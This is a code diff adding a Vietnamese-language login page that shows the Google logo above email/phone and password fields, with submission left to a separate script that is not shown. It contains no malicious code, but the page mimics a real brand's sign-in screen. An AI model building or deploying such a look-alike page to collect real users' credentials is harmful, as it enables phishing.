@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đăng nhập</title>
+  <link rel="stylesheet" href="./css/login.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Google_2015_logo.svg" alt="Logo">
+    </div>
+    <h2>Đăng nhập vào tài khoản của bạn</h2>
+    <form id="login-form">
+      <div class="input-group">
+        <input type="text" id="username" name="username" placeholder="Email hoặc số điện thoại" required>
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" name="password" placeholder="Mật khẩu" required>
+      </div>
+      <button type="submit">Đăng nhập</button>
+      <div class="forgot-password">
+        <a href="#">Quên mật khẩu?</a>
+      </div>
+    </form>
+    <div class="create-account">
+      <p>Chưa có tài khoản? <a href="#">Tạo tài khoản</a></p>
+    </div>
+    <p id="error-message" class="error"></p>
+  </div>
+
+  <script src="./js/login.js"></script>
+</body>
+</html>
